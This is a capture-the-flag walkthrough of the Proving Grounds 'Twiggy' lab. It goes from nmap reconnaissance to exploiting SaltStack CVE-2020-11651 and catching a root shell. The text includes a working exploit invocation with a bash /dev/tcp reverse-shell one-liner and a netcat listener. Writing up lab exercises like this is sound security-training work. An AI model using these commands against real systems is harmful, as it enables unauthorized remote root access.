### Twigger Proving Grounds Practice

### Difficulty = Easy

### IP Address = 192.168.153.62

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Twiggy]
└─$ nmap -sCV -A 192.168.153.62 -p22,53,80,4505,4506,8000 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 01:16 WAT
Nmap scan report for 192.168.153.62
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.42 seconds
```

From the scan nmap fingerprinted a service called `ZeroMQ ZMTP 2.0`

Also checking the header for the web server on port 8000 shows `salt-api/3000-1` 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Twiggy]
└─$ curl -I 192.168.153.62:8000 -v
*   Trying 192.168.153.62:8000...
* Connected to 192.168.153.62 (192.168.153.62) port 8000 (#0)
> HEAD / HTTP/1.1
> Host: 192.168.153.62:8000
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx/1.16.1
Server: nginx/1.16.1
< Date: Thu, 26 Jan 2023 00:23:03 GMT
Date: Thu, 26 Jan 2023 00:23:03 GMT
< Content-Type: application/json
Content-Type: application/json
< Content-Length: 146
Content-Length: 146
< Connection: keep-alive
Connection: keep-alive
< Access-Control-Expose-Headers: GET, POST
Access-Control-Expose-Headers: GET, POST
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Allow: GET, HEAD, POST
Allow: GET, HEAD, POST
< Access-Control-Allow-Credentials: true
Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: *
< X-Upstream: salt-api/3000-1
X-Upstream: salt-api/3000-1

< 
* Connection #0 to host 192.168.153.62 left intact
```

Searching for exploit on salt3000 api leads here [Exploit](https://github.com/jasperla/CVE-2020-11651-poc)

Lets try it out 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Twiggy]
└─$ python3 exploit.py --help                                           
usage: exploit.py [-h] [--master MASTER_IP] [--port MASTER_PORT] [--force] [--debug] [--run-checks] [--read READ_FILE] [--upload-src UPLOAD_SRC] [--upload-dest UPLOAD_DEST] [--exec EXEC]
                  [--exec-all EXEC_ALL]

Saltstack exploit for CVE-2020-11651 and CVE-2020-11652

options:
  -h, --help            show this help message and exit
  --master MASTER_IP, -m MASTER_IP
  --port MASTER_PORT, -p MASTER_PORT
  --force, -f
  --debug, -d
  --run-checks, -c
  --read READ_FILE, -r READ_FILE
  --upload-src UPLOAD_SRC
  --upload-dest UPLOAD_DEST
  --exec EXEC           Run a command on the master
  --exec-all EXEC_ALL   Run a command on all minions
```

Cool now lets give it the neccessary arguments

```
                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Twiggy]
└─$ python3 exploit.py --master 192.168.153.62 --exec "bash -i >& /dev/tcp/192.168.45.5/80 0>&1"  
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.153.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=
[+] Attemping to execute bash -i >& /dev/tcp/192.168.45.5/80 0>&1 on 192.168.153.62
[+] Successfully scheduled job: 20230126004102282992
```

Back on our listener 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Twiggy]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.153.62] 39112
bash: no job control in this shell
[root@twiggy root]# ls -al
ls -al
total 24
dr-xr-x---.  3 root root 141 Jan 25 19:13 .
dr-xr-xr-x. 17 root root 244 May 18  2020 ..
-rw-r--r--.  1 root root   0 Jul 27  2020 .bash_history
-rw-r--r--.  1 root root  18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root 176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root 176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root 100 Dec 28  2013 .cshrc
drwxr-----.  3 root root  19 May 18  2020 .pki
-rw-r--r--.  1 root root 129 Dec 28  2013 .tcshrc
-rw-r--r--   1 root root  33 Jan 25 19:13 proof.txt
[root@twiggy root]# 

```


And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>
